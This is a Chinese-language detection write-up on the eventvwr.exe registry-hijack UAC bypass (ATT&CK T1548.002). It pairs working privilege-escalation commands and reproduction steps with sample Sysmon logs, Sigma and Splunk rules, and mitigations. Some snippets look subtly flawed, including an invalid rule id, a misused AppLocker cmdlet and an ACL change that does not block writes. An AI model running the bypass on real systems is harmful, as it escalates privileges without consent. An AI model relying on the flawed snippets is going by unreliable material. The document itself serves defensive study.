# T1548-002-Win-绕过用户账户控制-Eventvwr.exe

## 描述

攻击者可通过利用`eventvwr.exe`的自动提升特性绕过Windows用户账户控制（UAC），在无需用户确认的情况下以高完整性级别执行恶意代码（T1548.002）。UAC是Windows的安全机制，限制进程权限提升（如从中等完整性到高完整性），通常通过提示用户确认管理员权限。`eventvwr.exe`（事件查看器）是Windows系统自带的可信进程，位于`C:\Windows\System32\`或`C:\Windows\SysWOW64\`，用于显示事件日志。

`eventvwr.exe`在启动时会读取注册表键`HKCU\Software\Classes\mscfile\shell\open\command`，以定位`mmc.exe`执行`.msc`文件（如`eventvwr.msc`）。攻击者可修改此键，替换为恶意二进制文件或脚本路径，使其在`eventvwr.exe`启动时以高完整性级别自动执行，无需UAC提示。这种“无文件”技术隐蔽性强，常用于权限提升或持久化。检测重点在于监控相关注册表修改及`eventvwr.exe`的异常子进程。

## 测试案例

1. **注册表劫持执行恶意二进制**  
   攻击者修改`HKCU\Software\Classes\mscfile\shell\open\command`，将`cmd.exe`设置为执行程序，启动`eventvwr.exe`时以高完整性运行命令提示符。  
2. **执行脚本绕过UAC**  
   攻击者配置PowerShell脚本路径，触发`eventvwr.exe`执行恶意脚本。  
3. **结合其他技术**  
   攻击者利用`eventvwr.exe`作为初始向量，结合横向移动或持久化技术（如计划任务）。

### 示例命令
- **攻击命令**（用户权限）：
  ```cmd
  reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "C:\Windows\System32\cmd.exe" /f
  eventvwr.exe
  ```
  - 修改注册表并触发`eventvwr.exe`，执行`cmd.exe`（高完整性）。  
  - **所需权限**：用户权限。  
  - **操作系统**：Windows Vista、7、8、8.1、10（部分版本可能已修补）。  
- **清理命令**：
  ```cmd
  reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f
  ```

## 检测日志

**Windows安全日志**  
- **事件ID 4688**：记录`eventvwr.exe`、`reg.exe`或恶意子进程（如`cmd.exe`）的进程创建。  

**Sysmon日志**  
- **事件ID 1**：记录进程创建，包含`eventvwr.exe`及其子进程的命令行参数。  
- **事件ID 13**：记录注册表修改，如`HKCU\Software\Classes\mscfile\shell\open\command`。  
- **事件ID 7**：记录`eventvwr.exe`加载的异常模块（如恶意DLL）。  

**配置日志记录**  
- 启用注册表审核：`计算机配置 > 策略 > Windows设置 > 安全设置 > 高级审核策略配置 > 对象访问 > 审核注册表`。  
- 启用命令行参数记录：`计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`。  
- 部署Sysmon以增强注册表和进程监控。

## 测试复现

### 环境准备
- **靶机**：Windows 10（或Vista、7、8、8.1，建议测试前确认UAC设置）。  
- **权限**：标准用户权限（无需管理员）。  
- **工具**：`eventvwr.exe`（系统自带）、`reg.exe`、Sysmon。  
- **UAC设置**：非最高级别（如“默认-仅通知应用程序更改”）。  
- **日志**：启用Windows安全日志和Sysmon。  

### 攻击步骤
1. **修改注册表**  
   - 配置`cmd.exe`为`mscfile`默认命令：
     ```cmd
     reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "C:\Windows\System32\cmd.exe" /f
     ```

2. **触发UAC绕过**  
   - 运行事件查看器：
     ```cmd
     eventvwr.exe
     ```
   - 观察`cmd.exe`是否以高完整性级别启动：
     ```powershell
     whoami /groups | findstr "High"
     ```

3. **验证结果**  
   - 检查注册表：
     ```powershell
     Get-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command"
     ```
   - 检查日志：  
     - **Windows安全日志（事件ID 4688）**：
       ```powershell
       Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4688 -and $_.Message -match "eventvwr.exe|cmd.exe" }
       ```
     - **Sysmon日志（事件ID 13）**：
       ```powershell
       Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object { $_.Id -eq 13 -and $_.Message -match "mscfile\\shell\\open\\command" }
       ```

4. **清理**  
   - 删除注册表键：
     ```cmd
     reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f
     ```

### 示例输出
```cmd
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "C:\Windows\System32\cmd.exe" /f
The operation completed successfully.

eventvwr.exe
<cmd.exe窗口弹出，运行whoami /groups显示Mandatory Label\High Mandatory Level>

reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f
The operation completed successfully.
```

**注意**：此复现仅用于学习和测试目的，需在合法授权的测试环境中进行，切勿用于非法活动。

## 测试留痕

- **Sysmon日志（事件ID 13，注册表修改）**：
  ```plaintext
  EventID: 13
  EventType: SetValue
  UtcTime: 2025-06-10 03:00:00.123
  ProcessGuid: {12345678-abcd-1234-abcd-1234567890ab}
  Image: C:\Windows\System32\reg.exe
  TargetObject: HKCU\Software\Classes\mscfile\shell\open\command
  Details: C:\Windows\System32\cmd.exe
  User: CONTOSO\User
  ```

- **Sysmon日志（事件ID 1，进程创建）**：
  ```plaintext
  EventID: 1
  UtcTime: 2025-06-10 03:00:00.234
  ProcessGuid: {12345678-abcd-1234-abcd-1234567890ac}
  ProcessId: 1234
  Image: C:\Windows\System32\eventvwr.exe
  CommandLine: C:\Windows\System32\eventvwr.exe
  ParentImage: C:\Windows\System32\cmd.exe
  User: CONTOSO\User
  IntegrityLevel: Medium
  ```

- **Sysmon日志（事件ID 1，恶意子进程）**：
  ```plaintext
  EventID: 1
  UtcTime: 2025-06-10 03:00:00.345
  ProcessGuid: {12345678-abcd-1234-abcd-1234567890ad}
  ProcessId: 1235
  Image: C:\Windows\System32\cmd.exe
  CommandLine: C:\Windows\System32\cmd.exe
  ParentImage: C:\Windows\System32\eventvwr.exe
  User: CONTOSO\User
  IntegrityLevel: High
  ```

## 检测规则/思路

**检测规则**  
通过监控注册表修改及`eventvwr.exe`的异常子进程，检测UAC绕过行为。以下是具体思路：

1. **日志分析**：
   - 监控Sysmon事件ID 13，检测`HKCU\Software\Classes\mscfile\shell\open\command`的修改。  
   - 监控Sysmon事件ID 1，检测`eventvwr.exe`及其子进程（如`cmd.exe`、`powershell.exe`），检查完整性级别提升。  
   - 监控Windows安全日志事件ID 4688，检测`eventvwr.exe`或`reg.exe`的异常进程创建。  
   - 检查进程调用树，识别`eventvwr.exe`启动非预期子进程（如`cmd.exe`）。  

2. **Sigma规则（UAC绕过注册表修改）**：
   ```yaml
   title: UAC绕过通过Event Viewer注册表劫持
   id: 7c81fec3-1c1d-43b0-996a-46753041b1b6
   status: stable
   description: 检测使用eventvwr.exe的UAC绕过，通过修改mscfile注册表键
   author: Florian Roth
   date: 2017/03/19
   references:
     - https://attack.mitre.org/techniques/T1548/002/
     - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
   tags:
     - attack.privilege_escalation
     - attack.t1548.002
     - attack.defense_evasion
   logsource:
     product: windows
     category: registry_event
   detection:
     selection:
       EventID: 13
       TargetObject|startswith: 'HKCU\'
       TargetObject|endswith: '\mscfile\shell\open\command'
     condition: selection
   fields:
     - TargetObject
     - Details
     - Image
     - User
   falsepositives:
     - 第三方软件修改mscfile注册表
   level: critical
   ```

3. **Sigma规则（Eventvwr异常子进程）**：
   ```yaml
   title: Eventvwr异常子进程执行
   id: h89012345-abcd-6789-0123-45678901bcde
   status: experimental
   description: 检测eventvwr.exe启动非预期子进程，可能与UAC绕过相关
   logsource:
     product: windows
     service: sysmon
   detection:
     selection:
       EventID: 1
       ParentImage|endswith: '\eventvwr.exe'
       Image|endswith:
         - '\cmd.exe'
         - '\powershell.exe'
         - '\wscript.exe'
         - '\cscript.exe'
     condition: selection
   fields:
     - Image
     - ParentImage
     - CommandLine
     - User
   falsepositives:
     - 管理员手动调试操作
   level: high
   ```

4. **SIEM规则**：
   - 检测UAC绕过相关行为。
   - 示例Splunk查询：
     ```spl
     (source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (EventID=13 TargetObject="*mscfile\shell\open\command*") OR (EventID=1 ParentImage="*eventvwr.exe" Image IN ("*cmd.exe","*powershell.exe","*wscript.exe","*cscript.exe"))) | stats count by Image, CommandLine, TargetObject, ParentImage, User, ComputerName
     ```

5. **注册表监控**：
   - 检查mscfile注册表键：
     ```powershell
     Get-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -ErrorAction SilentlyContinue
     ```

6. **工具支持**：
   - 使用Sysinternals Autoruns检查注册表键：
     ```cmd
     autoruns -a | findstr "mscfile"
     ```
   - 使用Process Monitor捕获实时注册表和进程活动。

7. **威胁情报整合**：
   - 检查子进程的哈希或命令行参数是否与已知恶意样本匹配，结合威胁情报平台（如VirusTotal、AlienVault）。  

## 建议

### 缓解措施

防御`eventvwr.exe`UAC绕过攻击需从注册表保护、UAC配置和进程监控入手：

1. **设置最高UAC级别**  
   - 配置UAC为“始终通知”：
     ```powershell
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 2
     ```

2. **锁定注册表键**  
   - 限制`HKCU\Software\Classes\mscfile`的写权限：
     ```powershell
     $acl = Get-Acl "HKCU:\Software\Classes\mscfile"
     $acl.SetAccessRuleProtection($true, $false)
     Set-Acl -Path "HKCU:\Software\Classes\mscfile" -AclObject $acl
     ```

3. **限制reg命令使用**  
   - 使用AppLocker限制非管理员执行`reg.exe`：
     ```powershell
     New-AppLockerPolicy -RuleType Path -Path "C:\Windows\System32\reg.exe" -Action Deny -User "Everyone"
     ```

4. **监控eventvwr.exe行为**  
   - 使用EDR工具检测`eventvwr.exe`的异常子进程。  
   - 配置Sysmon监控`eventvwr.exe`相关事件。  

5. **定期审计**  
   - 检查mscfile注册表：
     ```powershell
     Get-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -ErrorAction SilentlyContinue
     ```
   - 检查`eventvwr.exe`子进程：
     ```powershell
     Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object { $_.Id -eq 1 -and $_.Message -match "eventvwr.exe" }
     ```

6. **补丁管理**  
   - 确保系统安装最新补丁，部分Windows版本已修复此漏洞（如Windows 10 1803+）。  

## 参考推荐

- MITRE ATT&CK: T1548.002  
  <https://attack.mitre.org/techniques/T1548/002/>  
- 无文件UAC绕过（Eventvwr.exe注册表劫持）  
  <https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/>  
- UACME GitHub（UAC绕过方法集合）  
  <https://github.com/hfiref0x/UACME>